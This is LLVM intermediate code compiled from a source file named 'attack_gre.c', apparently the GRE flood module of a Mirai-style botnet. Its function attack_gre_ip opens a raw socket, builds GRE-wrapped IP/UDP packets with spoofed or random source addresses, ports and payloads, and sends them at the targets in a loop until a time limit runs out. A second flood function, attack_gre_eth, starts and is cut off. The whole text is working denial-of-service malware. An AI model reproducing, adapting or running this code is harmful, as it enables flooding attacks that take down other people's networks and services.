; ModuleID = 'attack_gre.c'
source_filename = "attack_gre.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }

@LOCAL_ADDR = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @attack_gre_ip(i32 %0, i8 zeroext %1, %struct.attack_target* %2, i8 zeroext %3, %struct.attack_option* %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias align 16 i8* @calloc(i64 %37, i64 8) #4
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 24, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #4
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = add nsw i64 %79, %81
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %24, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #4
  store i32 %84, i32* %12, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

86:                                               ; preds = %5
  br label %451

87:                                               ; preds = %5
  store i32 1, i32* %11, align 4
  %88 = load i32, i32* %12, align 4
  %89 = bitcast i32* %11 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #4
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

92:                                               ; preds = %87
  %93 = load i32, i32* %12, align 4
  %94 = call i32 @close(i32 %93)
  br label %451

95:                                               ; preds = %87
  store i32 0, i32* %11, align 4
  br label %96

96:                                               ; preds = %246, %95
  %97 = load i32, i32* %11, align 4
  %98 = load i8, i8* %7, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %249

101:                                              ; preds = %96
  %102 = call noalias align 16 i8* @calloc(i64 1510, i64 8) #4
  %103 = load i8**, i8*** %13, align 8
  %104 = load i32, i32* %11, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %13, align 8
  %108 = load i32, i32* %11, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %25, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %26, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.iphdr*
  store %struct.iphdr* %118, %struct.iphdr** %27, align 8
  %119 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %120 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %119, i64 1
  %121 = bitcast %struct.iphdr* %120 to %struct.udphdr*
  store %struct.udphdr* %121, %struct.udphdr** %28, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = and i8 %124, 15
  %126 = or i8 %125, 64
  store i8 %126, i8* %123, align 4
  %127 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %128 = bitcast %struct.iphdr* %127 to i8*
  %129 = load i8, i8* %128, align 4
  %130 = and i8 %129, -16
  %131 = or i8 %130, 5
  store i8 %131, i8* %128, align 4
  %132 = load i8, i8* %14, align 1
  %133 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i32 0, i32 1
  store i8 %132, i8* %134, align 1
  %135 = load i32, i32* %20, align 4
  %136 = sext i32 %135 to i64
  %137 = add i64 52, %136
  %138 = trunc i64 %137 to i16
  %139 = call zeroext i16 @htons(i16 zeroext %138) #5
  %140 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 2
  store i16 %139, i16* %141, align 2
  %142 = load i16, i16* %15, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %142) #5
  %144 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 3
  store i16 %143, i16* %145, align 4
  %146 = load i8, i8* %16, align 1
  %147 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 5
  store i8 %146, i8* %148, align 4
  %149 = load i8, i8* %17, align 1
  %150 = icmp ne i8 %149, 0
  br i1 %150, label %151, label %155

151:                                              ; preds = %101
  %152 = call zeroext i16 @htons(i16 zeroext 16384) #5
  %153 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 4
  store i16 %152, i16* %154, align 2
  br label %155

155:                                              ; preds = %151, %101
  %156 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 6
  store i8 47, i8* %157, align 1
  %158 = load i32, i32* %23, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 8
  store i32 %158, i32* %160, align 4
  %161 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %162 = load i32, i32* %11, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i64 %163
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i32 0, i32 1
  %166 = load i32, i32* %165, align 4
  %167 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 9
  store i32 %166, i32* %168, align 4
  %169 = call zeroext i16 @htons(i16 zeroext 2048) #5
  %170 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %171 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %170, i32 0, i32 1
  store i16 %169, i16* %171, align 2
  %172 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %173 = bitcast %struct.iphdr* %172 to i8*
  %174 = load i8, i8* %173, align 4
  %175 = and i8 %174, 15
  %176 = or i8 %175, 64
  store i8 %176, i8* %173, align 4
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = bitcast %struct.iphdr* %177 to i8*
  %179 = load i8, i8* %178, align 4
  %180 = and i8 %179, -16
  %181 = or i8 %180, 5
  store i8 %181, i8* %178, align 4
  %182 = load i8, i8* %14, align 1
  %183 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 1
  store i8 %182, i8* %184, align 1
  %185 = load i32, i32* %20, align 4
  %186 = sext i32 %185 to i64
  %187 = add i64 28, %186
  %188 = trunc i64 %187 to i16
  %189 = call zeroext i16 @htons(i16 zeroext %188) #5
  %190 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 2
  store i16 %189, i16* %191, align 2
  %192 = load i16, i16* %15, align 2
  %193 = zext i16 %192 to i32
  %194 = xor i32 %193, -1
  %195 = trunc i32 %194 to i16
  %196 = call zeroext i16 @htons(i16 zeroext %195) #5
  %197 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 3
  store i16 %196, i16* %198, align 4
  %199 = load i8, i8* %16, align 1
  %200 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 5
  store i8 %199, i8* %201, align 4
  %202 = load i8, i8* %17, align 1
  %203 = icmp ne i8 %202, 0
  br i1 %203, label %204, label %208

204:                                              ; preds = %155
  %205 = call zeroext i16 @htons(i16 zeroext 16384) #5
  %206 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 4
  store i16 %205, i16* %207, align 2
  br label %208

208:                                              ; preds = %204, %155
  %209 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 6
  store i8 17, i8* %210, align 1
  %211 = call i32 @rand_next()
  %212 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 8
  store i32 %211, i32* %213, align 4
  %214 = load i8, i8* %22, align 1
  %215 = icmp ne i8 %214, 0
  br i1 %215, label %216, label %222

216:                                              ; preds = %208
  %217 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 9
  %219 = load i32, i32* %218, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  br label %230

222:                                              ; preds = %208
  %223 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 8
  %225 = load i32, i32* %224, align 4
  %226 = sub i32 %225, 1024
  %227 = xor i32 %226, -1
  %228 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 9
  store i32 %227, i32* %229, align 4
  br label %230

230:                                              ; preds = %222, %216
  %231 = load i16, i16* %18, align 2
  %232 = call zeroext i16 @htons(i16 zeroext %231) #5
  %233 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %234 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %233, i32 0, i32 0
  store i16 %232, i16* %234, align 2
  %235 = load i16, i16* %19, align 2
  %236 = call zeroext i16 @htons(i16 zeroext %235) #5
  %237 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %238 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %237, i32 0, i32 1
  store i16 %236, i16* %238, align 2
  %239 = load i32, i32* %20, align 4
  %240 = sext i32 %239 to i64
  %241 = add i64 8, %240
  %242 = trunc i64 %241 to i16
  %243 = call zeroext i16 @htons(i16 zeroext %242) #5
  %244 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %245 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %244, i32 0, i32 2
  store i16 %243, i16* %245, align 2
  br label %246

246:                                              ; preds = %230
  %247 = load i32, i32* %11, align 4
  %248 = add nsw i32 %247, 1
  store i32 %248, i32* %11, align 4
  br label %96, !llvm.loop !6

249:                                              ; preds = %96
  br label %250

250:                                              ; preds = %249, %450
  store i32 0, i32* %11, align 4
  br label %251

251:                                              ; preds = %441, %250
  %252 = load i32, i32* %11, align 4
  %253 = load i8, i8* %7, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp slt i32 %252, %254
  br i1 %255, label %256, label %444

256:                                              ; preds = %251
  %257 = load i8**, i8*** %13, align 8
  %258 = load i32, i32* %11, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds i8*, i8** %257, i64 %259
  %261 = load i8*, i8** %260, align 8
  store i8* %261, i8** %29, align 8
  %262 = load i8*, i8** %29, align 8
  %263 = bitcast i8* %262 to %struct.iphdr*
  store %struct.iphdr* %263, %struct.iphdr** %30, align 8
  %264 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i64 1
  %266 = bitcast %struct.iphdr* %265 to %struct.grehdr*
  store %struct.grehdr* %266, %struct.grehdr** %31, align 8
  %267 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %268 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %267, i64 1
  %269 = bitcast %struct.grehdr* %268 to %struct.iphdr*
  store %struct.iphdr* %269, %struct.iphdr** %32, align 8
  %270 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i64 1
  %272 = bitcast %struct.iphdr* %271 to %struct.udphdr*
  store %struct.udphdr* %272, %struct.udphdr** %33, align 8
  %273 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %274 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %273, i64 1
  %275 = bitcast %struct.udphdr* %274 to i8*
  store i8* %275, i8** %34, align 8
  %276 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %277 = load i32, i32* %11, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %276, i64 %278
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %279, i32 0, i32 2
  %281 = load i8, i8* %280, align 4
  %282 = zext i8 %281 to i32
  %283 = icmp slt i32 %282, 32
  br i1 %283, label %284, label %305

284:                                              ; preds = %256
  %285 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %286 = load i32, i32* %11, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 1
  %290 = load i32, i32* %289, align 4
  %291 = call i32 @ntohl(i32 %290) #5
  %292 = call i32 @rand_next()
  %293 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 2
  %298 = load i8, i8* %297, align 4
  %299 = zext i8 %298 to i32
  %300 = lshr i32 %292, %299
  %301 = add i32 %291, %300
  %302 = call i32 @htonl(i32 %301) #5
  %303 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 9
  store i32 %302, i32* %304, align 4
  br label %305

305:                                              ; preds = %284, %256
  %306 = load i32, i32* %23, align 4
  %307 = icmp eq i32 %306, -1
  br i1 %307, label %308, label %312

308:                                              ; preds = %305
  %309 = call i32 @rand_next()
  %310 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %311 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %310, i32 0, i32 8
  store i32 %309, i32* %311, align 4
  br label %312

312:                                              ; preds = %308, %305
  %313 = load i16, i16* %15, align 2
  %314 = zext i16 %313 to i32
  %315 = icmp eq i32 %314, 65535
  br i1 %315, label %316, label %331

316:                                              ; preds = %312
  %317 = call i32 @rand_next()
  %318 = and i32 %317, 65535
  %319 = trunc i32 %318 to i16
  %320 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 3
  store i16 %319, i16* %321, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 3
  %324 = load i16, i16* %323, align 4
  %325 = zext i16 %324 to i32
  %326 = sub nsw i32 %325, 1000
  %327 = xor i32 %326, -1
  %328 = trunc i32 %327 to i16
  %329 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %330 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %329, i32 0, i32 3
  store i16 %328, i16* %330, align 4
  br label %331

331:                                              ; preds = %316, %312
  %332 = load i16, i16* %18, align 2
  %333 = zext i16 %332 to i32
  %334 = icmp eq i32 %333, 65535
  br i1 %334, label %335, label %341

335:                                              ; preds = %331
  %336 = call i32 @rand_next()
  %337 = and i32 %336, 65535
  %338 = trunc i32 %337 to i16
  %339 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %340 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %339, i32 0, i32 0
  store i16 %338, i16* %340, align 2
  br label %341

341:                                              ; preds = %335, %331
  %342 = load i16, i16* %19, align 2
  %343 = zext i16 %342 to i32
  %344 = icmp eq i32 %343, 65535
  br i1 %344, label %345, label %351

345:                                              ; preds = %341
  %346 = call i32 @rand_next()
  %347 = and i32 %346, 65535
  %348 = trunc i32 %347 to i16
  %349 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %350 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %349, i32 0, i32 1
  store i16 %348, i16* %350, align 2
  br label %351

351:                                              ; preds = %345, %341
  %352 = load i8, i8* %22, align 1
  %353 = icmp ne i8 %352, 0
  br i1 %353, label %358, label %354

354:                                              ; preds = %351
  %355 = call i32 @rand_next()
  %356 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %357 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %356, i32 0, i32 9
  store i32 %355, i32* %357, align 4
  br label %364

358:                                              ; preds = %351
  %359 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %360 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %359, i32 0, i32 9
  %361 = load i32, i32* %360, align 4
  %362 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %363 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %362, i32 0, i32 9
  store i32 %361, i32* %363, align 4
  br label %364

364:                                              ; preds = %358, %354
  %365 = load i8, i8* %21, align 1
  %366 = icmp ne i8 %365, 0
  br i1 %366, label %367, label %374

367:                                              ; preds = %364
  %368 = load i8*, i8** %34, align 8
  %369 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %368, i32 %369)
  %370 = load i8*, i8** %34, align 8
  %371 = load i32, i32* %20, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds i8, i8* %370, i64 %372
  store i8 0, i8* %373, align 1
  br label %374

374:                                              ; preds = %367, %364
  %375 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i32 0, i32 7
  store i16 0, i16* %376, align 2
  %377 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %378 = bitcast %struct.iphdr* %377 to i16*
  %379 = call zeroext i16 @checksum_generic(i16* %378, i32 20)
  %380 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %381 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %380, i32 0, i32 7
  store i16 %379, i16* %381, align 2
  %382 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 7
  store i16 0, i16* %383, align 2
  %384 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %385 = bitcast %struct.iphdr* %384 to i16*
  %386 = call zeroext i16 @checksum_generic(i16* %385, i32 20)
  %387 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %388 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %387, i32 0, i32 7
  store i16 %386, i16* %388, align 2
  %389 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %390 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %389, i32 0, i32 3
  store i16 0, i16* %390, align 2
  %391 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %392 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %393 = bitcast %struct.udphdr* %392 to i8*
  %394 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %395 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %394, i32 0, i32 2
  %396 = load i16, i16* %395, align 2
  %397 = load i32, i32* %20, align 4
  %398 = sext i32 %397 to i64
  %399 = add i64 8, %398
  %400 = trunc i64 %399 to i32
  %401 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %391, i8* %393, i16 zeroext %396, i32 %400)
  %402 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %403 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %402, i32 0, i32 3
  store i16 %401, i16* %403, align 2
  %404 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %405 = load i32, i32* %11, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i64 %406
  %408 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %407, i32 0, i32 0
  %409 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %408, i32 0, i32 0
  store i16 2, i16* %409, align 4
  %410 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %411 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %410, i32 0, i32 9
  %412 = load i32, i32* %411, align 4
  %413 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %414 = load i32, i32* %11, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %413, i64 %415
  %417 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %416, i32 0, i32 0
  %418 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %417, i32 0, i32 2
  %419 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %418, i32 0, i32 0
  store i32 %412, i32* %419, align 4
  %420 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %421 = load i32, i32* %11, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %420, i64 %422
  %424 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i32 0, i32 0
  %425 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %424, i32 0, i32 1
  store i16 0, i16* %425, align 2
  %426 = load i32, i32* %12, align 4
  %427 = load i8*, i8** %29, align 8
  %428 = load i32, i32* %20, align 4
  %429 = sext i32 %428 to i64
  %430 = add i64 52, %429
  %431 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %432 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %433 = load i32, i32* %11, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i64 %434
  %436 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %435, i32 0, i32 0
  %437 = bitcast %struct.sockaddr_in* %436 to %struct.sockaddr*
  store %struct.sockaddr* %437, %struct.sockaddr** %431, align 8
  %438 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %439 = load %struct.sockaddr*, %struct.sockaddr** %438, align 8
  %440 = call i64 @sendto(i32 %426, i8* %427, i64 %430, i32 16384, %struct.sockaddr* %439, i32 16)
  br label %441

441:                                              ; preds = %374
  %442 = load i32, i32* %11, align 4
  %443 = add nsw i32 %442, 1
  store i32 %443, i32* %11, align 4
  br label %251, !llvm.loop !8

444:                                              ; preds = %251
  %445 = call i64 @time(i64* null) #4
  %446 = load i32, i32* %24, align 4
  %447 = sext i32 %446 to i64
  %448 = icmp sgt i64 %445, %447
  br i1 %448, label %449, label %450

449:                                              ; preds = %444
  br label %451

450:                                              ; preds = %444
  br label %250

451:                                              ; preds = %86, %92, %449
  ret void
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #1

declare i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #3

declare i32 @rand_next() #2

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #3

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32) #3

declare void @rand_alphastr(i8*, i32) #2

declare zeroext i16 @checksum_generic(i16*, i32) #2

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @attack_gre_eth(i32 %0, i8 zeroext %1, %struct.attack_target* %2, i8 zeroext %3, %struct.attack_option* %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
